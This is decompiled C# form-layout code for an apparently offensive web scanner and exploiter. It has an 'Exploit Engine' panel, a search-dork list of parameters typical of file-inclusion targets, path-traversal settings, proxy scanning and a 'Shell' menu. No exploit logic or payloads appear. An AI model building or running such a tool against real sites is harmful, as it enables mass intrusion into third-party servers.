		this.btnSkinP.Location = new Point(426, 58);
		this.btnSkinP.Margin = new Padding(4, 5, 4, 5);
		this.btnSkinP.Name = "btnSkinP";
		this.btnSkinP.Size = new Size(70, 30);
		this.btnSkinP.TabIndex = 3;
		this.btnSkinP.Text = "<<";
		this.btnSkinP.UseVisualStyleBackColor = true;
		this.cmbSkin.Anchor = (AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right);
		this.cmbSkin.DropDownStyle = ComboBoxStyle.DropDownList;
		this.cmbSkin.Font = new Font("Courier New", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
		this.cmbSkin.FormattingEnabled = true;
		this.cmbSkin.Location = new Point(219, 58);
		this.cmbSkin.Margin = new Padding(4, 5, 4, 5);
		this.cmbSkin.Name = "cmbSkin";
		this.cmbSkin.Size = new Size(202, 28);
		this.cmbSkin.TabIndex = 1;
		this.chkSkin.AutoSize = true;
		this.chkSkin.Checked = true;
		this.chkSkin.CheckState = CheckState.Checked;
		this.chkSkin.Location = new Point(218, 26);
		this.chkSkin.Margin = new Padding(4, 5, 4, 5);
		this.chkSkin.Name = "chkSkin";
		this.chkSkin.Size = new Size(177, 24);
		this.chkSkin.TabIndex = 0;
		this.chkSkin.Text = "Enable App skinned";
		this.chkSkin.UseVisualStyleBackColor = true;
		this.chkGUIHotKey.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
		this.chkGUIHotKey.CheckAlign = ContentAlignment.MiddleRight;
		this.chkGUIHotKey.ForeColor = SystemColors.ControlText;
		this.chkGUIHotKey.Location = new Point(217, 96);
		this.chkGUIHotKey.Margin = new Padding(4, 5, 4, 5);
		this.chkGUIHotKey.Name = "chkGUIHotKey";
		this.chkGUIHotKey.Size = new Size(273, 32);
		this.chkGUIHotKey.TabIndex = 4;
		this.chkGUIHotKey.Text = "&GUI Show/Hide hot key (Alt+?)";
		this.chkGUIHotKey.TextAlign = ContentAlignment.MiddleRight;
		this.chkGUIHotKey.UseVisualStyleBackColor = true;
		this.chkSysTray.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
		this.chkSysTray.CheckAlign = ContentAlignment.MiddleRight;
		this.chkSysTray.ForeColor = SystemColors.ControlText;
		this.chkSysTray.Location = new Point(217, 128);
		this.chkSysTray.Margin = new Padding(4, 5, 4, 5);
		this.chkSysTray.Name = "chkSysTray";
		this.chkSysTray.Size = new Size(273, 32);
		this.chkSysTray.TabIndex = 6;
		this.chkSysTray.Text = "&Minimize to System Tray";
		this.chkSysTray.TextAlign = ContentAlignment.MiddleRight;
		this.chkSysTray.UseVisualStyleBackColor = true;
		this.grbExploithing.Controls.Add(this.lstExpoitType);
		this.grbExploithing.Location = new Point(3, 256);
		this.grbExploithing.Name = "grbExploithing";
		this.grbExploithing.Size = new Size(579, 97);
		this.grbExploithing.TabIndex = 2;
		this.grbExploithing.TabStop = false;
		this.grbExploithing.Text = "Exploit Engine";
		this.lstExpoitType.Anchor = (AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
		this.lstExpoitType.CheckOnClick = true;
		this.lstExpoitType.FormattingEnabled = true;
		this.lstExpoitType.IntegralHeight = false;
		this.lstExpoitType.Location = new Point(8, 22);
		this.lstExpoitType.MultiColumn = true;
		this.lstExpoitType.Name = "lstExpoitType";
		this.lstExpoitType.Size = new Size(562, 62);
		this.lstExpoitType.TabIndex = 0;
		this.lstExpoitType.ThreeDCheckBoxes = true;
		this.lstExpoitType.UseTabStops = false;
		this.GroupBox1.Controls.Add(this.chkScanningBlackListProxy);
		this.GroupBox1.Controls.Add(this.txtAccept);
		this.GroupBox1.Controls.Add(this.txtUserAgent);
		this.GroupBox1.Controls.Add(this.lblHTTPdelay);
		this.GroupBox1.Controls.Add(this.numExploitingDelay);
		this.GroupBox1.Controls.Add(this.numHTTPTimeout);
		this.GroupBox1.Controls.Add(this.lblHTTPretry);
		this.GroupBox1.Controls.Add(this.numHTTPRetry);
		this.GroupBox1.Controls.Add(this.lblHTTPtimeout);
		this.GroupBox1.Controls.Add(this.numScanningDelay);
		this.GroupBox1.Controls.Add(this.lblHTTPdelayIP);
		this.GroupBox1.Controls.Add(this.lblAccept);
		this.GroupBox1.Controls.Add(this.lblUserAgent);
		this.GroupBox1.Location = new Point(3, 3);
		this.GroupBox1.Name = "GroupBox1";
		this.GroupBox1.Size = new Size(579, 253);
		this.GroupBox1.TabIndex = 0;
		this.GroupBox1.TabStop = false;
		this.GroupBox1.Text = "HTTP General";
		this.chkScanningBlackListProxy.AutoSize = true;
		this.chkScanningBlackListProxy.Checked = true;
		this.chkScanningBlackListProxy.CheckState = CheckState.Checked;
		this.chkScanningBlackListProxy.Location = new Point(8, 149);
		this.chkScanningBlackListProxy.Margin = new Padding(4, 5, 4, 5);
		this.chkScanningBlackListProxy.Name = "chkScanningBlackListProxy";
		this.chkScanningBlackListProxy.Size = new Size(278, 24);
		this.chkScanningBlackListProxy.TabIndex = 38;
		this.chkScanningBlackListProxy.Text = "Enable Scanner Proxy IP BlackList";
		this.chkScanningBlackListProxy.UseVisualStyleBackColor = true;
		this.txtAccept.Location = new Point(134, 211);
		this.txtAccept.Name = "txtAccept";
		this.txtAccept.Size = new Size(434, 26);
		this.txtAccept.TabIndex = 36;
		this.txtAccept.Text = "text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8";
		this.txtUserAgent.Location = new Point(134, 178);
		this.txtUserAgent.Name = "txtUserAgent";
		this.txtUserAgent.Size = new Size(434, 26);
		this.txtUserAgent.TabIndex = 34;
		this.txtUserAgent.Text = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0";
		this.lblHTTPdelay.Location = new Point(130, 118);
		this.lblHTTPdelay.Margin = new Padding(4, 0, 4, 0);
		this.lblHTTPdelay.Name = "lblHTTPdelay";
		this.lblHTTPdelay.Size = new Size(438, 26);
		this.lblHTTPdelay.TabIndex = 33;
		this.lblHTTPdelay.Text = "Exploiting Delay (ms)";
		this.lblHTTPdelay.TextAlign = ContentAlignment.MiddleLeft;
		NumericUpDown numExploitingDelay = this.numExploitingDelay;
		int[] array = new int[4];
		array[0] = 200;
		numExploitingDelay.Increment = new decimal(array);
		this.numExploitingDelay.Location = new Point(8, 117);
		this.numExploitingDelay.Margin = new Padding(4, 5, 4, 5);
		NumericUpDown numExploitingDelay2 = this.numExploitingDelay;
		int[] array2 = new int[4];
		array2[0] = 50000;
		numExploitingDelay2.Maximum = new decimal(array2);
		NumericUpDown numExploitingDelay3 = this.numExploitingDelay;
		int[] array3 = new int[4];
		array3[0] = 100;
		numExploitingDelay3.Minimum = new decimal(array3);
		this.numExploitingDelay.Name = "numExploitingDelay";
		this.numExploitingDelay.Size = new Size(112, 26);
		this.numExploitingDelay.TabIndex = 4;
		NumericUpDown numExploitingDelay4 = this.numExploitingDelay;
		int[] array4 = new int[4];
		array4[0] = 200;
		numExploitingDelay4.Value = new decimal(array4);
		this.numHTTPTimeout.Location = new Point(8, 25);
		this.numHTTPTimeout.Margin = new Padding(4, 5, 4, 5);
		NumericUpDown numHTTPTimeout = this.numHTTPTimeout;
		int[] array5 = new int[4];
		array5[0] = 60;
		numHTTPTimeout.Maximum = new decimal(array5);
		NumericUpDown numHTTPTimeout2 = this.numHTTPTimeout;
		int[] array6 = new int[4];
		array6[0] = 5;
		numHTTPTimeout2.Minimum = new decimal(array6);
		this.numHTTPTimeout.Name = "numHTTPTimeout";
		this.numHTTPTimeout.Size = new Size(112, 26);
		this.numHTTPTimeout.TabIndex = 0;
		NumericUpDown numHTTPTimeout3 = this.numHTTPTimeout;
		int[] array7 = new int[4];
		array7[0] = 20;
		numHTTPTimeout3.Value = new decimal(array7);
		this.lblHTTPretry.Location = new Point(130, 55);
		this.lblHTTPretry.Margin = new Padding(4, 0, 4, 0);
		this.lblHTTPretry.Name = "lblHTTPretry";
		this.lblHTTPretry.Size = new Size(438, 26);
		this.lblHTTPretry.TabIndex = 9;
		this.lblHTTPretry.Text = "Request Retry Limit";
		this.lblHTTPretry.TextAlign = ContentAlignment.MiddleLeft;
		NumericUpDown numHTTPRetry = this.numHTTPRetry;
		int[] array8 = new int[4];
		array8[0] = 5;
		numHTTPRetry.Increment = new decimal(array8);
		this.numHTTPRetry.Location = new Point(8, 54);
		this.numHTTPRetry.Margin = new Padding(4, 5, 4, 5);
		NumericUpDown numHTTPRetry2 = this.numHTTPRetry;
		int[] array9 = new int[4];
		array9[0] = 60;
		numHTTPRetry2.Maximum = new decimal(array9);
		NumericUpDown numHTTPRetry3 = this.numHTTPRetry;
		int[] array10 = new int[4];
		array10[0] = 3;
		numHTTPRetry3.Minimum = new decimal(array10);
		this.numHTTPRetry.Name = "numHTTPRetry";
		this.numHTTPRetry.Size = new Size(112, 26);
		this.numHTTPRetry.TabIndex = 1;
		NumericUpDown numHTTPRetry4 = this.numHTTPRetry;
		int[] array11 = new int[4];
		array11[0] = 10;
		numHTTPRetry4.Value = new decimal(array11);
		this.lblHTTPtimeout.Location = new Point(130, 25);
		this.lblHTTPtimeout.Margin = new Padding(4, 0, 4, 0);
		this.lblHTTPtimeout.Name = "lblHTTPtimeout";
		this.lblHTTPtimeout.Size = new Size(438, 26);
		this.lblHTTPtimeout.TabIndex = 7;
		this.lblHTTPtimeout.Text = "Connection Timeout (Secunds)";
		this.lblHTTPtimeout.TextAlign = ContentAlignment.MiddleLeft;
		NumericUpDown numScanningDelay = this.numScanningDelay;
		int[] array12 = new int[4];
		array12[0] = 1000;
		numScanningDelay.Increment = new decimal(array12);
		this.numScanningDelay.Location = new Point(8, 85);
		this.numScanningDelay.Margin = new Padding(4, 5, 4, 5);
		NumericUpDown numScanningDelay2 = this.numScanningDelay;
		int[] array13 = new int[4];
		array13[0] = 60000;
		numScanningDelay2.Maximum = new decimal(array13);
		NumericUpDown numScanningDelay3 = this.numScanningDelay;
		int[] array14 = new int[4];
		array14[0] = 1000;
		numScanningDelay3.Minimum = new decimal(array14);
		this.numScanningDelay.Name = "numScanningDelay";
		this.numScanningDelay.Size = new Size(112, 26);
		this.numScanningDelay.TabIndex = 2;
		NumericUpDown numScanningDelay4 = this.numScanningDelay;
		int[] array15 = new int[4];
		array15[0] = 5000;
		numScanningDelay4.Value = new decimal(array15);
		this.lblHTTPdelayIP.Location = new Point(130, 86);
		this.lblHTTPdelayIP.Margin = new Padding(4, 0, 4, 0);
		this.lblHTTPdelayIP.Name = "lblHTTPdelayIP";
		this.lblHTTPdelayIP.Size = new Size(438, 26);
		this.lblHTTPdelayIP.TabIndex = 30;
		this.lblHTTPdelayIP.Text = "Scanner Delay per IP (Proxies) (ms)";
		this.lblHTTPdelayIP.TextAlign = ContentAlignment.MiddleLeft;
		this.lblAccept.Location = new Point(10, 211);
		this.lblAccept.Margin = new Padding(4, 0, 4, 0);
		this.lblAccept.Name = "lblAccept";
		this.lblAccept.Size = new Size(110, 26);
		this.lblAccept.TabIndex = 37;
		this.lblAccept.Text = "Accept";
		this.lblAccept.TextAlign = ContentAlignment.MiddleRight;
		this.lblUserAgent.Location = new Point(10, 178);
		this.lblUserAgent.Margin = new Padding(4, 0, 4, 0);
		this.lblUserAgent.Name = "lblUserAgent";
		this.lblUserAgent.Size = new Size(110, 26);
		this.lblUserAgent.TabIndex = 35;
		this.lblUserAgent.Text = "User Agent";
		this.lblUserAgent.TextAlign = ContentAlignment.MiddleRight;
		this.btnExcludeUrlWords.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
		this.btnExcludeUrlWords.Enabled = false;
		this.btnExcludeUrlWords.Location = new Point(417, 14);
		this.btnExcludeUrlWords.Name = "btnExcludeUrlWords";
		this.btnExcludeUrlWords.Size = new Size(140, 31);
		this.btnExcludeUrlWords.TabIndex = 1;
		this.btnExcludeUrlWords.Text = "Add";
		this.btnExcludeUrlWords.UseVisualStyleBackColor = true;
		this.lstExcludeUrlWords.Anchor = (AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
		this.lstExcludeUrlWords.ContextMenuStrip = this.mnuExcludeUrlWords;
		this.lstExcludeUrlWords.FormattingEnabled = true;
		this.lstExcludeUrlWords.IntegralHeight = false;
		this.lstExcludeUrlWords.ItemHeight = 20;
		this.lstExcludeUrlWords.Location = new Point(3, 52);
		this.lstExcludeUrlWords.Name = "lstExcludeUrlWords";
		this.lstExcludeUrlWords.SelectionMode = SelectionMode.MultiExtended;
		this.lstExcludeUrlWords.Size = new Size(553, 104);
		this.lstExcludeUrlWords.TabIndex = 2;
		this.mnuExcludeUrlWords.ImageScalingSize = new Size(24, 24);
		this.mnuExcludeUrlWords.Items.AddRange(new ToolStripItem[]
		{
			this.mnuExcludeUrlWordsRemove
		});
		this.mnuExcludeUrlWords.Name = "mnuChecked";
		this.mnuExcludeUrlWords.ShowImageMargin = false;
		this.mnuExcludeUrlWords.ShowItemToolTips = false;
		this.mnuExcludeUrlWords.Size = new Size(124, 34);
		this.mnuExcludeUrlWordsRemove.Name = "mnuExcludeUrlWordsRemove";
		this.mnuExcludeUrlWordsRemove.Size = new Size(123, 30);
		this.mnuExcludeUrlWordsRemove.Text = "Remove";
		this.txtExcludeUrlWords.Anchor = (AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right);
		this.txtExcludeUrlWords.CharacterCasing = CharacterCasing.Lower;
		this.txtExcludeUrlWords.Location = new Point(100, 14);
		this.txtExcludeUrlWords.Name = "txtExcludeUrlWords";
		this.txtExcludeUrlWords.Size = new Size(308, 26);
		this.txtExcludeUrlWords.TabIndex = 0;
		this.lblSkipWordURL.AutoSize = true;
		this.lblSkipWordURL.Location = new Point(8, 20);
		this.lblSkipWordURL.Margin = new Padding(4, 0, 4, 0);
		this.lblSkipWordURL.Name = "lblSkipWordURL";
		this.lblSkipWordURL.Size = new Size(86, 20);
		this.lblSkipWordURL.TabIndex = 33;
		this.lblSkipWordURL.Text = "Skip words";
		this.lblSkipWordURL.TextAlign = ContentAlignment.MiddleLeft;
		this.lblLFIPathCount.Location = new Point(74, 11);
		this.lblLFIPathCount.Margin = new Padding(4, 0, 4, 0);
		this.lblLFIPathCount.Name = "lblLFIPathCount";
		this.lblLFIPathCount.Size = new Size(308, 26);
		this.lblLFIPathCount.TabIndex = 1;
		this.lblLFIPathCount.Text = "Path Traversal Count";
		this.lblLFIPathCount.TextAlign = ContentAlignment.MiddleLeft;
		this.bcWorker.WorkerReportsProgress = true;
		this.bcWorker.WorkerSupportsCancellation = true;
		this.pnlNotepad.AutoScroll = true;
		this.pnlNotepad.Controls.Add(this.txtNotepad);
		this.pnlNotepad.Location = new Point(2428, 698);
		this.pnlNotepad.Margin = new Padding(4, 5, 4, 5);
		this.pnlNotepad.Name = "pnlNotepad";
		this.pnlNotepad.Size = new Size(178, 60);
		this.pnlNotepad.TabIndex = 29;
		this.pnlNotepad.Visible = false;
		this.txtNotepad.Dock = DockStyle.Fill;
		this.txtNotepad.Font = new Font("Courier New", 10.125f, FontStyle.Regular, GraphicsUnit.Point, 0);
		this.txtNotepad.Location = new Point(0, 0);
		this.txtNotepad.Margin = new Padding(2);
		this.txtNotepad.MaxLength = 999999999;
		this.txtNotepad.Multiline = true;
		this.txtNotepad.Name = "txtNotepad";
		this.txtNotepad.ScrollBars = ScrollBars.Both;
		this.txtNotepad.Size = new Size(178, 60);
		this.txtNotepad.TabIndex = 1;
		this.txtNotepad.WordWrap = false;
		this.mnuAbout.ImageScalingSize = new Size(24, 24);
		this.mnuAbout.Items.AddRange(new ToolStripItem[]
		{
			this.mnuAboutClipboard,
			this.mnuAboutHWID
		});
		this.mnuAbout.Name = "mnuChecked";
		this.mnuAbout.ShowImageMargin = false;
		this.mnuAbout.ShowItemToolTips = false;
		this.mnuAbout.Size = new Size(234, 64);
		this.mnuAboutClipboard.Name = "mnuAboutClipboard";
		this.mnuAboutClipboard.Size = new Size(233, 30);
		this.mnuAboutClipboard.Text = "Clipboard my Contact";
		this.mnuAboutHWID.Name = "mnuAboutHWID";
		this.mnuAboutHWID.Size = new Size(233, 30);
		this.mnuAboutHWID.Text = "Clipboard HWID";
		this.pnlScanner.AutoScroll = true;
		this.pnlScanner.Controls.Add(this.grbScannerURL);
		this.pnlScanner.Controls.Add(this.grbDorks);
		this.pnlScanner.Location = new Point(274, 12);
		this.pnlScanner.Margin = new Padding(4, 5, 4, 5);
		this.pnlScanner.Name = "pnlScanner";
		this.pnlScanner.Size = new Size(712, 388);
		this.pnlScanner.TabIndex = 30;
		this.pnlScanner.Visible = false;
		this.grbScannerURL.Controls.Add(this.dtgQueue);
		this.grbScannerURL.Controls.Add(this.tsSearchFilter);
		this.grbScannerURL.Dock = DockStyle.Fill;
		this.grbScannerURL.Location = new Point(0, 286);
		this.grbScannerURL.Name = "grbScannerURL";
		this.grbScannerURL.Size = new Size(712, 102);
		this.grbScannerURL.TabIndex = 1;
		this.grbScannerURL.TabStop = false;
		this.grbScannerURL.Text = "A.\r\u0013";
		this.dtgQueue.AllowDrop = true;
		this.dtgQueue.AllowUserToAddRows = false;
		this.dtgQueue.AllowUserToDeleteRows = false;
		this.dtgQueue.AllowUserToResizeColumns = false;
		this.dtgQueue.AllowUserToResizeRows = false;
		this.dtgQueue.BackgroundColor = SystemColors.Window;
		this.dtgQueue.BorderStyle = BorderStyle.Fixed3D;
		this.dtgQueue.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dtgQueue.ColumnHeadersVisible = false;
		this.dtgQueue.Columns.AddRange(new DataGridViewColumn[]
		{
			this.Column1
		});
		this.dtgQueue.Dock = DockStyle.Fill;
		this.dtgQueue.Location = new Point(3, 57);
		this.dtgQueue.Name = "dtgQueue";
		this.dtgQueue.ReadOnly = true;
		this.dtgQueue.RowHeadersVisible = false;
		this.dtgQueue.RowHeadersWidth = 60;
		this.dtgQueue.ScrollBars = ScrollBars.Vertical;
		this.dtgQueue.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
		this.dtgQueue.ShowCellErrors = false;
		this.dtgQueue.ShowCellToolTips = false;
		this.dtgQueue.ShowEditingIcon = false;
		this.dtgQueue.ShowRowErrors = false;
		this.dtgQueue.Size = new Size(706, 42);
		this.dtgQueue.TabIndex = 37;
		this.Column1.AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
		this.Column1.HeaderText = "URL";
		this.Column1.Name = "Column1";
		this.Column1.ReadOnly = true;
		this.Column1.Resizable = DataGridViewTriState.False;
		this.Column1.SortMode = DataGridViewColumnSortMode.NotSortable;
		this.tsSearchFilter.AutoSize = false;
		this.tsSearchFilter.GripStyle = ToolStripGripStyle.Hidden;
		this.tsSearchFilter.ImageScalingSize = new Size(24, 24);
		this.tsSearchFilter.Items.AddRange(new ToolStripItem[]
		{
			this.txtSearchFilter,
			this.btnSearchFilter,
			this.ToolStripSeparator9,
			this.chkHideDork
		});
		this.tsSearchFilter.Location = new Point(3, 22);
		this.tsSearchFilter.Name = "tsSearchFilter";
		this.tsSearchFilter.Padding = new Padding(0, 0, 2, 0);
		this.tsSearchFilter.RenderMode = ToolStripRenderMode.System;
		this.tsSearchFilter.ShowItemToolTips = false;
		this.tsSearchFilter.Size = new Size(706, 35);
		this.tsSearchFilter.TabIndex = 5;
		this.tsSearchFilter.Text = "ToolStrip2";
		this.txtSearchFilter.Enabled = false;
		this.txtSearchFilter.Name = "txtSearchFilter";
		this.txtSearchFilter.Size = new Size(300, 35);
		this.txtSearchFilter.Text = "Action.action;";
		this.btnSearchFilter.CheckOnClick = true;
		this.btnSearchFilter.Image = Class6.SearchContract_16x_24;
		this.btnSearchFilter.ImageTransparentColor = Color.Magenta;
		this.btnSearchFilter.Name = "btnSearchFilter";
		this.btnSearchFilter.Size = new Size(176, 32);
		this.btnSearchFilter.Text = "Filter by keyword";
		this.ToolStripSeparator9.Alignment = ToolStripItemAlignment.Right;
		this.ToolStripSeparator9.Name = "ToolStripSeparator9";
		this.ToolStripSeparator9.Size = new Size(6, 35);
		this.chkHideDork.Alignment = ToolStripItemAlignment.Right;
		this.chkHideDork.CheckOnClick = true;
		this.chkHideDork.Image = Class6.AutoArrangeShapes_16x_24;
		this.chkHideDork.ImageTransparentColor = Color.Magenta;
		this.chkHideDork.Name = "chkHideDork";
		this.chkHideDork.Size = new Size(129, 32);
		this.chkHideDork.Text = "Hide Dorks";
		this.grbDorks.Controls.Add(this.lblSearchSummary_1);
		this.grbDorks.Controls.Add(this.lblSearchSummary_2);
		this.grbDorks.Controls.Add(this.txtMultiDorks);
		this.grbDorks.Controls.Add(this.lstSearchEngine);
		this.grbDorks.Dock = DockStyle.Top;
		this.grbDorks.Location = new Point(0, 0);
		this.grbDorks.Name = "grbDorks";
		this.grbDorks.Size = new Size(712, 286);
		this.grbDorks.TabIndex = 0;
		this.grbDorks.TabStop = false;
		this.grbDorks.Text = "Dorks";
		this.lblSearchSummary_1.BackColor = SystemColors.Window;
		this.lblSearchSummary_1.Dock = DockStyle.Fill;
		this.lblSearchSummary_1.Font = new Font("Courier New", 8f, FontStyle.Regular, GraphicsUnit.Point, 0);
		this.lblSearchSummary_1.Location = new Point(165, 22);
		this.lblSearchSummary_1.Name = "lblSearchSummary_1";
		this.lblSearchSummary_1.Size = new Size(290, 261);
		this.lblSearchSummary_1.TabIndex = 70;
		this.lblSearchSummary_1.Visible = false;
		this.lblSearchSummary_2.BackColor = SystemColors.Window;
		this.lblSearchSummary_2.Dock = DockStyle.Right;
		this.lblSearchSummary_2.Font = new Font("Courier New", 8f, FontStyle.Regular, GraphicsUnit.Point, 0);
		this.lblSearchSummary_2.Location = new Point(455, 22);
		this.lblSearchSummary_2.Name = "lblSearchSummary_2";
		this.lblSearchSummary_2.Size = new Size(254, 261);
		this.lblSearchSummary_2.TabIndex = 69;
		this.lblSearchSummary_2.Visible = false;
		this.txtMultiDorks.Dock = DockStyle.Fill;
		this.txtMultiDorks.Location = new Point(165, 22);
		this.txtMultiDorks.MaxLength = 999999999;
		this.txtMultiDorks.Multiline = true;
		this.txtMultiDorks.Name = "txtMultiDorks";
		this.txtMultiDorks.ScrollBars = ScrollBars.Vertical;
		this.txtMultiDorks.Size = new Size(544, 261);
		this.txtMultiDorks.TabIndex = 60;
		this.txtMultiDorks.Text = "?item_id=\r\n?productID=\r\narticle ?id=\r\ndetail ?id=\r\nnewscat ?id=\r\n?page=\r\n?pageID=\r\n?cat_id=\r\n?filename=\r\n?loadfile=\r\n?section=\r\n?url=\r\n?site=\r\n?path=\r\n?include_file=\r\n?current_frame=\r\n?openfile=";
		this.txtMultiDorks.WordWrap = false;
		this.lstSearchEngine.CheckOnClick = true;
		this.lstSearchEngine.Dock = DockStyle.Left;
		this.lstSearchEngine.FormattingEnabled = true;
		this.lstSearchEngine.IntegralHeight = false;
		this.lstSearchEngine.Location = new Point(3, 22);
		this.lstSearchEngine.Name = "lstSearchEngine";
		this.lstSearchEngine.Size = new Size(162, 261);
		this.lstSearchEngine.TabIndex = 67;
		this.lstSearchEngine.ThreeDCheckBoxes = true;
		this.lstSearchEngine.UseCompatibleTextRendering = true;
		this.lstSearchEngine.UseTabStops = false;
		this.mnuQueue.ImageScalingSize = new Size(24, 24);
		this.mnuQueue.Items.AddRange(new ToolStripItem[]
		{
			this.mnuQueueShell,
			this.mnuQueueClipboard,
			this.mnuQueueSP3,
			this.mnuQueueSelectAll,
			this.mnuQueueSP1,
			this.mnuQueueAddURLs,
			this.mnuQueueSP2,
			this.mnuQueueTrash,
			this.mnuQueueRomove
		});
		this.mnuQueue.Name = "mnuChecked";
		this.mnuQueue.ShowImageMargin = false;
		this.mnuQueue.ShowItemToolTips = false;
		this.mnuQueue.Size = new Size(172, 202);
		this.mnuQueueShell.Name = "mnuQueueShell";
		this.mnuQueueShell.Size = new Size(171, 30);
		this.mnuQueueShell.Text = "Shell";
		this.mnuQueueClipboard.Name = "mnuQueueClipboard";
		this.mnuQueueClipboard.Size = new Size(171, 30);
		this.mnuQueueClipboard.Text = "Clipboard";
		this.mnuQueueSP3.Name = "mnuQueueSP3";
		this.mnuQueueSP3.Size = new Size(168, 6);
		this.mnuQueueSelectAll.Name = "mnuQueueSelectAll";
		this.mnuQueueSelectAll.Size = new Size(171, 30);
		this.mnuQueueSelectAll.Text = "Select All";
		this.mnuQueueSP1.Name = "mnuQueueSP1";
		this.mnuQueueSP1.Size = new Size(168, 6);
		this.mnuQueueAddURLs.Name = "mnuQueueAddURLs";
		this.mnuQueueAddURLs.Size = new Size(171, 30);
		this.mnuQueueAddURLs.Text = "Add URL's";
		this.mnuQueueSP2.Name = "mnuQueueSP2";
		this.mnuQueueSP2.Size = new Size(168, 6);
		this.mnuQueueTrash.Name = "mnuQueueTrash";
		this.mnuQueueTrash.Size = new Size(171, 30);
		this.mnuQueueTrash.Text = "Move to Trash";
		this.mnuQueueRomove.Name = "mnuQueueRomove";
		this.mnuQueueRomove.Size = new Size(171, 30);
		this.mnuQueueRomove.Text = "Remove";
		this.pnlExploiter.AutoScroll = true;
		this.pnlExploiter.Controls.Add(this.dtgFileInclusao);
		this.pnlExploiter.Controls.Add(this.tsFileInclusao);
		this.pnlExploiter.Location = new Point(271, 516);
		this.pnlExploiter.Margin = new Padding(4, 5, 4, 5);
		this.pnlExploiter.Name = "pnlExploiter";
		this.pnlExploiter.Size = new Size(610, 132);
		this.pnlExploiter.TabIndex = 31;
		this.pnlExploiter.Visible = false;
		this.dtgFileInclusao.AllowUserToAddRows = false;
		this.dtgFileInclusao.AllowUserToDeleteRows = false;
		this.dtgFileInclusao.AllowUserToOrderColumns = true;
		this.dtgFileInclusao.AllowUserToResizeRows = false;
		this.dtgFileInclusao.BackgroundColor = SystemColors.Window;
		this.dtgFileInclusao.BorderStyle = BorderStyle.Fixed3D;
		this.dtgFileInclusao.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dtgFileInclusao.Columns.AddRange(new DataGridViewColumn[]
		{
			this.DataGridViewImageColumn1,
			this.DataGridViewTextBoxColumn2,
			this.DataGridViewTextBoxColumn3,
			this.DataGridViewTextBoxColumn6,
			this.DataGridViewTextBoxColumn8,
			this.Column18
		});
		this.dtgFileInclusao.Dock = DockStyle.Fill;
		this.dtgFileInclusao.EditMode = DataGridViewEditMode.EditOnF2;
		this.dtgFileInclusao.Location = new Point(0, 33);
		this.dtgFileInclusao.Name = "dtgFileInclusao";
		this.dtgFileInclusao.RowHeadersVisible = false;
		this.dtgFileInclusao.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
		this.dtgFileInclusao.ShowCellErrors = false;
		this.dtgFileInclusao.ShowEditingIcon = false;
		this.dtgFileInclusao.ShowRowErrors = false;
		this.dtgFileInclusao.Size = new Size(610, 99);
		this.dtgFileInclusao.TabIndex = 39;
		this.DataGridViewImageColumn1.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCellsExceptHeader;
		this.DataGridViewImageColumn1.HeaderText = "";
		this.DataGridViewImageColumn1.Name = "DataGridViewImageColumn1";
		this.DataGridViewImageColumn1.Resizable = DataGridViewTriState.False;
		this.DataGridViewImageColumn1.Width = 5;
		this.DataGridViewTextBoxColumn2.HeaderText = "URL";
		this.DataGridViewTextBoxColumn2.Name = "DataGridViewTextBoxColumn2";
		this.DataGridViewTextBoxColumn2.Resizable = DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn2.Width = 400;
		this.DataGridViewTextBoxColumn3.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn3.HeaderText = "Type";
		this.DataGridViewTextBoxColumn3.Name = "DataGridViewTextBoxColumn3";
		this.DataGridViewTextBoxColumn3.ReadOnly = true;
		this.DataGridViewTextBoxColumn3.Resizable = DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn3.Width = 79;
		this.DataGridViewTextBoxColumn6.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn6.HeaderText = "Country";
		this.DataGridViewTextBoxColumn6.Name = "DataGridViewTextBoxColumn6";
		this.DataGridViewTextBoxColumn6.ReadOnly = true;
		this.DataGridViewTextBoxColumn6.Resizable = DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn8.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn8.FillWeight = 120f;
		this.DataGridViewTextBoxColumn8.HeaderText = "Checked";
		this.DataGridViewTextBoxColumn8.Name = "DataGridViewTextBoxColumn8";
		this.DataGridViewTextBoxColumn8.ReadOnly = true;
		this.DataGridViewTextBoxColumn8.Resizable = DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn8.Width = 108;
		this.Column18.HeaderText = "Comments";
		this.Column18.Name = "Column18";
		this.tsFileInclusao.GripStyle = ToolStripGripStyle.Hidden;
		this.tsFileInclusao.ImageScalingSize = new Size(24, 24);
		this.tsFileInclusao.Items.AddRange(new ToolStripItem[]
		{
			this.cmbFileInclusaoFilter,
			this.cmbFileInclusaoSearch,
			this.btnFileInclusaoSearchClear,
			this.txtFileInclusaoSearch,
			this.btnFileInclusaoSearch,
			this.lblSQLiNoInjectCount,
			this.lblFileInclusao
		});
		this.tsFileInclusao.Location = new Point(0, 0);
		this.tsFileInclusao.Name = "tsFileInclusao";
		this.tsFileInclusao.Padding = new Padding(0, 0, 2, 0);
		this.tsFileInclusao.RenderMode = ToolStripRenderMode.System;
		this.tsFileInclusao.Size = new Size(610, 33);
		this.tsFileInclusao.TabIndex = 3;
		this.tsFileInclusao.Text = "ToolStrip2";
		this.cmbFileInclusaoFilter.DropDownStyle = ComboBoxStyle.DropDownList;
		this.cmbFileInclusaoFilter.Name = "cmbFileInclusaoFilter";
